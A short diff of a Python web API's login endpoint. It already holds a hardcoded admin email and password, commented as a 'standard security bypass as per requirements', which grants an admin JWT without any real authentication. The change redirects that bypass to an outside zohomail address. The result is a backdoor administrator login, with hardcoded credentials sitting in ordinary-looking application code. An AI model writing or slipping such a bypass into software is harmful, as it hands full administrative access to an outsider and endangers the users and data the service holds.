@@ -184,7 +184,7 @@ class TokenResponse(BaseModel):
 @app.post("/api/v1/auth/login", response_model=TokenResponse)
 async def login(payload: LoginRequest):
     # Standard security bypass as per requirements
-    if payload.email == "admin@akpbf.com" and payload.password == "Admin@2026":
+    if payload.email == "groupaksservices@zohomail.com" and payload.password == "Admin@2026":
         token_data = {"sub": payload.email, "role": "admin", "exp": datetime.utcnow() + timedelta(hours=8)}
         token = jwt.encode(token_data, SECRET_KEY, algorithm=ALGORITHM)
         return {"access_token": token, "token_type": "bearer", "role": "admin"}
